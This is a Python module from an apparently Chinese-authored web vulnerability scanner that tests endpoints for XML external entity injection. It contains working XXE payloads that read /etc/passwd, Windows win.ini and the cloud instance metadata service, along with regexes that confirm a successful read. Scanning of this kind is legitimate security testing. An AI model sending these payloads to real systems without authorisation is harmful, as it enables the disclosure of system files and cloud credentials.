"""
XXE（XML 外部实体注入）检测模块
Author: 火柴 | GitHub: huocai250

修复:
- 使用 BaseScanner.post 的 extra_headers 参数，而非手动合并
- 改进 XML 端点探测：只测试返回200的端点
"""
import logging
from core.logger import C as Colors
log = logging.getLogger("webscan")


import re
from core.scanner import BaseScanner

XXE_PAYLOADS = [
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root><data>&xxe;</data></root>',
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///C:/windows/win.ini">]><root><data>&xxe;</data></root>',
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><root><data>&xxe;</data></root>',
]

XXE_SIGNATURES = [
    r"root:.*:0:0:", r"\[boot loader\]", r"\[fonts\]",
    r"daemon:", r"nobody:", r"ami-id", r"instance-id",
]

XML_CONTENT_TYPE = {"Content-Type": "application/xml"}

XML_ENDPOINTS = [
    "/api", "/api/v1", "/api/v2", "/upload",
    "/import", "/parse", "/convert", "/xml", "/soap",
]


class XXEScanner(BaseScanner):
    def run(self):
        _before = self.result.total()
        log.info( "XXE 注入检测...")
        # 先探测哪些端点响应 XML 请求
        reachable = self._find_xml_endpoints()
        reachable.append(self.target)  # 主目标也测

        for url in reachable:
            for payload in XXE_PAYLOADS:
                # 修复：使用 extra_headers 参数，不污染 session
                r = self.post(url,
                              data=payload.encode("utf-8"),
                              extra_headers=XML_CONTENT_TYPE)
                if r and self._has_xxe(r.text):
                    log.warning("[VULN] " +  f"[XXE] 发现 XML 外部实体注入: {url}")
                    self.result.add("XXE", "CRITICAL",
                                    f"端点存在 XXE 注入漏洞",
                                    r.text[:200], url=url)
                    return  # 发现即停

        log.info( "XXE 检测完成，未发现明显漏洞")
        self._log_module_done("XXE", _before)

    def _find_xml_endpoints(self) -> list:
        found = []
        for path in XML_ENDPOINTS:
            url = self.build_url(path)
            r   = self.get(url)
            if r and r.status_code in [200, 201, 405, 415]:
                found.append(url)
        return found

    def _has_xxe(self, text: str) -> bool:
        return any(re.search(p, text) for p in XXE_SIGNATURES)
